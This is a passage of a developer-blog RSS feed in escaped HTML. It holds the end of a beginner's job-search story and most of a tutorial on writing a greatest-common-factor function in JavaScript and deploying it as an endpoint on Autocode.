  i built few projects like a todo-app ,weather-app,chat-app, and also a movie-search-app , i also exploited several api's&lt;br&gt;
 after this few things i started applying for jobs and in two weeks no response from any job which i applied for&lt;br&gt;
    offcourse i became frustrated,then i decided to go farther , in previous searches i didnt have a resume neither did i have a portfolio to show my works, so i started working on my portfolio it was not much of a deal thou --&amp;gt; &lt;a href="https://hillaryvictor.netlify.app"&gt;https://hillaryvictor.netlify.app&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;after that i developed a quite cool resume and also decided to have an online presence and i chose Dev.to &lt;br&gt;
  well my job Search continued , a week passed two weeks passed and after few more weeks i began recieving calls from companies, usually your skills will be tested and few times you may be rejected but whats it all about?&lt;/p&gt;

&lt;p&gt;keep striving a single||multiple rejection does not mean you arent worth it&lt;/p&gt;

&lt;p&gt;at the time &lt;br&gt;
of writing this i am currently undergoing a technical interview&lt;/p&gt;

&lt;p&gt;Keep it cool out there guys||girls and keep codding!! &lt;/p&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>react</category>
      <category>html</category>
    </item>
    <item>
      <title>Solving Coding Challenges with JavaScript Functions on Autocode</title>
      <author>Janeth</author>
      <pubDate>Fri, 25 Jun 2021 17:43:10 +0000</pubDate>
      <link>https://dev.to/mss_ledezma/solving-coding-challenges-with-javascript-functions-on-autocode-4l61</link>
      <guid>https://dev.to/mss_ledezma/solving-coding-challenges-with-javascript-functions-on-autocode-4l61</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--pP2Wj2vf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/0%2Ad_cP9PQKZRQJOJuJ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pP2Wj2vf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/0%2Ad_cP9PQKZRQJOJuJ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://janethl.medium.com/my-journey-to-becoming-a-software-engineer-91415b5e1210"&gt;In my first blog&lt;/a&gt;, I wrote about the many factors influencing my decision to join General Assembly's coding Bootcamp. I also committed to blogging about my journey and writing tutorials because teaching is the best way to reinforce learning. As promised, here is an update on my progress during the 12 week General Assembly Software Engineering Immersive program. This tutorial will cover my favorite topic in Unit 1 --- JavasScript and functions!&lt;/p&gt;

&lt;p&gt;We've been zooming through every day and week, and while it's been challenging to intake so much information in such a short period of time, I'm loving the program's curriculum and structured daily agenda. Our 12 weeks are broken down into 4 units that cover fundamental technologies for full-stack application building.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LS1MzOC9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2Aaf-JKBnogTKAkwtr7r1SDw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LS1MzOC9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2Aaf-JKBnogTKAkwtr7r1SDw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this tutorial, we will apply some of the tips that I've learned through General Assembly to strengthen our JavaScript skills and to approach solving coding challenges.&lt;/p&gt;

&lt;p&gt;Let's get started! 🧑🏽‍💻👩🏽‍💻 👇🏼&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#intro-to-javascript-functions"&gt;
  &lt;/a&gt;
  Intro to JavaScript Functions
&lt;/h3&gt;

&lt;p&gt;JavaScript is an essential programming language. These days, you can do everything with it: from selecting and manipulating elements on a website to setting up Node.js servers that can handle millions of requests per second. But before we can begin leveraging the power of JavaScript, we need to master functions.&lt;/p&gt;

&lt;p&gt;Functions are fundamental building blocks of JavaScript. They are reusable blocks of code that we can leverage throughout our applications as many times as we need to create our desired functionality. Today we will practice solving &lt;strong&gt;3&lt;/strong&gt; &lt;strong&gt;challenge JavaScript problems with functions.&lt;/strong&gt; We will follow four steps to solve each problem:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt; Carefully read the problem to understand it&lt;/li&gt;
&lt;li&gt; Use pseudocode to craft a plan for solving the problem&lt;/li&gt;
&lt;li&gt; Code it out on &lt;a href="https://autocode.com/"&gt;Autocode&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt; Test and Deploy your solution on &lt;a href="https://autocode.com/"&gt;Autocode&lt;/a&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I've chosen to code on &lt;a href="http://AUtocode.com"&gt;Autocode&lt;/a&gt; to help us better understand the power of functions. &lt;a href="http://Autocode.com"&gt;Autocode&lt;/a&gt; is an online code editor and hosting platform that will allow us to easily publish our functions and make them accessible via the web without worrying about setting up hosting through third-party services. Autocode will automatically turn our JavaScript functions into HTTP(S) &lt;strong&gt;endpoints&lt;/strong&gt;. 🤯&lt;/p&gt;

&lt;p&gt;Let's get started! 👩🏽‍💻&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#first%C2%A0-set-up-your-free-account-on%C2%A0autocode"&gt;
  &lt;/a&gt;
  First ... set up your free account on Autocode
&lt;/h3&gt;

&lt;p&gt;Head on over to &lt;a href="https://autocode.com/signup/"&gt;Autocode.com&lt;/a&gt; and sign up for a free account. Choose a subdomain where your projects will be hosted and set a password.&lt;/p&gt;

&lt;p&gt;Once you've signed up, navigate to your &lt;a href="https://autocode.com/manage/apps/"&gt;&lt;strong&gt;Project Management&lt;/strong&gt;&lt;/a&gt; dashboard and click &lt;strong&gt;New Project.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YUU_qi7X--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2ABV5FW62F10fbUNptvYqrHA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YUU_qi7X--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2ABV5FW62F10fbUNptvYqrHA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We will be creating endpoints for each of the 3 functions that we will be coding. An endpoint is a means for you and other external apps to communicate with your system to perform certain actions by making HTTP requests to the URL representing it.&lt;/p&gt;

&lt;p&gt;You'll be brought into &lt;a href="http://autocode.com"&gt;Autocode's&lt;/a&gt; IDE; this is where we will write the logic to solve 3 challenge problems.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SINyLMOt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AdRMuW1bQMjZhdG7y6BSD6g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SINyLMOt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AdRMuW1bQMjZhdG7y6BSD6g.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;From here, there are a few pieces to point out;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  The &lt;strong&gt;Event selector is at the top&lt;/strong&gt;. Here you can choose what type of event will execute the code in your endpoint. For this tutorial, we will use the default, which is a normal HTTP request.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0um9A58B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AKjU5lg-b60EaoLpy2Eeltw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0um9A58B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AKjU5lg-b60EaoLpy2Eeltw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  When you press the green "Run" button, you will be prompted to name your project. Name it &lt;code&gt;functions&lt;/code&gt; for the tutorial and hit &lt;strong&gt;Save new project&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--42W-Pn9k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AdEKyBiCfpaTAK_Uv-VfVww.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--42W-Pn9k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AdEKyBiCfpaTAK_Uv-VfVww.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  You'll notice the endpoint URL show up at the bottom of the file. This is where your endpoints will live on the web.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8QpDWQ6J--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AH-2hrjs3FVlX0j3iOyOirw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8QpDWQ6J--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AH-2hrjs3FVlX0j3iOyOirw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  The Endpoint viewer window shows up in the bottom right. This will show you the results of your endpoint execution. You can use it to view logs as well.&lt;/li&gt;
&lt;li&gt;  All Autocode endpoints are immediately available on the web once they're saved.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Great, now that you have set up your coding environment, we can begin with &lt;strong&gt;Challenge Problem #1!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let's tackle it together! 🤜🏼🤛🏼&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#challenge-problem-1-greatest-common%C2%A0factor"&gt;
  &lt;/a&gt;
  Challenge Problem #1: Greatest Common Factor:
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Step 1: Carefully read the problem to understand it&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Write a function that returns the greatest common factor between &lt;code&gt;**num1**&lt;/code&gt; and &lt;code&gt;**num2**.&lt;/code&gt; This means that the function should return the largest number that divides both &lt;code&gt;**num1**&lt;/code&gt; and &lt;code&gt;**num2**.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For example, if we pass in the number 6 and number 10 into our function, our function should return 2. Inputting 4 and 8 should return 4 etc...&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 2&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 4&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 15&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Let's prepare our coding environment. Head back to &lt;a href="http://autocode.com"&gt;Autocode&lt;/a&gt;. Create a new endpoint by right-clicking the &lt;code&gt;functions&lt;/code&gt; folder on the left of the browser and selecting &lt;code&gt;New endpoint file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--GGoK16Qk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AvBYfxXUxi6G0qBW3JXLezg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--GGoK16Qk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AvBYfxXUxi6G0qBW3JXLezg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Name your file &lt;code&gt;functions/greatestCommonFactor.js&lt;/code&gt; as I have:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EhsTjz0k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AwTMzPcKLuNVcebf3q6d6dA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EhsTjz0k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AwTMzPcKLuNVcebf3q6d6dA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You will notice that your new file is pre-populated with a sample hello world function.&lt;/p&gt;

&lt;p&gt;Let's take a moment to analyze and understand how this function is created.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VZph1ap0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AB0Rsu1x9H0wFnC3C-hBCoQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VZph1ap0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AB0Rsu1x9H0wFnC3C-hBCoQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The comment in &lt;code&gt;line 1--6&lt;/code&gt; defines the &lt;code&gt;parameter&lt;/code&gt;types that the function takes and the &lt;code&gt;return&lt;/code&gt; type. In this sample, the function is expecting a &lt;code&gt;name&lt;/code&gt;parameter of type &lt;code&gt;string&lt;/code&gt; and it will return a &lt;code&gt;body&lt;/code&gt; of type &lt;code&gt;object.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;line 7&lt;/code&gt; is exporting our function with a&lt;code&gt;module.exports&lt;/code&gt; method. Let's check it out. Change the name in &lt;code&gt;line 7&lt;/code&gt; to your name as I have in the screenshot.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--s60wgl6g--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AaTPhMtE1uJdg3ah4V8HP2Q.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--s60wgl6g--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AaTPhMtE1uJdg3ah4V8HP2Q.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Press the green &lt;code&gt;run&lt;/code&gt; button to test out this sample function. You will see your code executed in the Endpoint viewer window with "Hello &lt;code&gt;&amp;lt;yourName&amp;gt;&lt;/code&gt;, welcome to Autocode!" message.&lt;/p&gt;

&lt;p&gt;You can also click the autogenerated endpoint URL on the bottom left, and a new window will open in the browser to display the message:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--g8oRb5SN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AOUnHV4h7tqdhWiHx3GQOEw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--g8oRb5SN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AOUnHV4h7tqdhWiHx3GQOEw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can test passing a &lt;code&gt;name&lt;/code&gt; parameter into your function via the URL and press enter to reload the page as I have: &lt;code&gt;?name=Student&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fDff1mjx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2ALtoSi6MgrI4hoq7Tx4okwg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fDff1mjx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2ALtoSi6MgrI4hoq7Tx4okwg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It's that simple to deploy reusable functions through &lt;a href="http://Autocode"&gt;Autocode&lt;/a&gt;! If you would like to dive deeper into Autocode's framework, check out &lt;a href="https://github.com/acode/FunctionScript"&gt;FunctionScript on Github&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Now that we understand how to set up functions on &lt;a href="http://autocode.com"&gt;Autocode&lt;/a&gt; let's begin solving our first challenge problem!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2: Use pseudocode to craft a plan for solving the problem&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;First, let's begin planning our execution with pseudocode. Pseudocode is a technique that helps programmers plan out an algorithm in a manner that is easy to understand. Pseudocode does not use any coding syntax, but it fully describes the necessary logic to build our functions. This facilitates implementation because we'll translate each line into code using the JavaScript Syntax...easy, right?&lt;/p&gt;

&lt;p&gt;Let's try it!&lt;/p&gt;

&lt;p&gt;Reread the problem as many times as needed and begin pseudocoding when ready:&lt;/p&gt;

&lt;p&gt;Write a function that returns the greatest common factor between &lt;code&gt;**num1**&lt;/code&gt; and &lt;code&gt;**num2**.&lt;/code&gt;This means that the function should return the largest number that divides both &lt;code&gt;**num1**&lt;/code&gt; and &lt;code&gt;**num2**.&lt;/code&gt; &lt;/p&gt;

&lt;p&gt;For example, if we pass in the number 6 and number 10 into our function, our function should return 2. Inputting 4 and 8 should return 4 etc...&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 2&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 4&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 15&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Pseudocode:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;//First we need to define the functions expected parameters and return types in a comment&lt;/span&gt;

&lt;span class="c1"&gt;//Then we use module.exports to export our function and pass in two numbers (num1, num2) as parameters&lt;/span&gt;

&lt;span class="c1"&gt;//We will set a for loop with the iterator (i) set to num1&lt;/span&gt;

&lt;span class="c1"&gt;//As long as i is greater or equal to 1 continue the for loop&lt;/span&gt;

&lt;span class="c1"&gt;//Everytime the for loop continues decrement i by 1&lt;/span&gt;

&lt;span class="c1"&gt;//As we decrement we check to see if num1 modulo i is equal to zero and if num2 modulo i is equal to zero&lt;/span&gt;

&lt;span class="c1"&gt;//If both conditions are met then we will return i&lt;/span&gt;

&lt;span class="c1"&gt;//If the conditions aren't met then we have our for loop continue decrementing until both are both are met&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 3: Code it out on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now that we've planned out how to solve our challenge problem, we're ready to code it out.&lt;/p&gt;

&lt;p&gt;Delete the sample hello world function inside the IDE.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VZph1ap0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AB0Rsu1x9H0wFnC3C-hBCoQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VZph1ap0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AB0Rsu1x9H0wFnC3C-hBCoQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Translate your pseudocode approach to JavaScript syntax inside the IDE as I have:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="cm"&gt;/**
* My greatestCommonFactor function 
* @param {number} num1 First number
* @param {number} num2 Second number
* @returns {number} i
*/&lt;/span&gt;
&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exports&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;num2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;num1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num1&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 3: Test and Deploy your solution on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Select the &lt;strong&gt;Payload&lt;/strong&gt; button on the bottom right. Set test parameters by creating an object setting &lt;code&gt;num1&lt;/code&gt; and &lt;code&gt;num2&lt;/code&gt; as your keys and give them any two numbers you'd like. I've chosen &lt;code&gt;1550 and 1000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--XtrUZHUu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A1FMQ7qtdwjZrS0oNugj2Gw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--XtrUZHUu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A1FMQ7qtdwjZrS0oNugj2Gw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Select the green &lt;strong&gt;Run&lt;/strong&gt; button once you've set your test parameters. The greatest common factor of &lt;code&gt;1550&lt;/code&gt; and &lt;code&gt;1000&lt;/code&gt; is in fact &lt;code&gt;50&lt;/code&gt;! Great Job. ⭐️&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--n5UsF5FI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A136yVQo99stV8FMI1oPFzA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--n5UsF5FI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A136yVQo99stV8FMI1oPFzA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can see your function live by clicking the autogenerated URL on the bottom left via your functions docs. To view the docs, select &lt;strong&gt;Advanced Settings&lt;/strong&gt; in the bottom left cornerand then &lt;strong&gt;Generated API Reference.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---rskd82B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A0-seeSrkHB0kQt89-39YEA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---rskd82B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2A0-seeSrkHB0kQt89-39YEA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can test passing in different numbers in the parameters sections and &lt;strong&gt;Run&lt;/strong&gt; yourfunctionto check the greatest common factor as times as your heart desires.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wu3HiHi2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AP62uCXw3wgtdmbsxl45ljA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wu3HiHi2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AP62uCXw3wgtdmbsxl45ljA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Breakdown of our Solution to challenge problem #1:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 1--6:&lt;/strong&gt; We set type &lt;code&gt;number&lt;/code&gt; for &lt;code&gt;num1&lt;/code&gt; and &lt;code&gt;num2&lt;/code&gt; and a return type of &lt;code&gt;number&lt;/code&gt; for &lt;code&gt;i&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 8:&lt;/strong&gt; We export our async function with &lt;code&gt;module.exports&lt;/code&gt; and pass in our two parameters &lt;code&gt;(num1, num2).&lt;/code&gt;&lt;/p&gt;

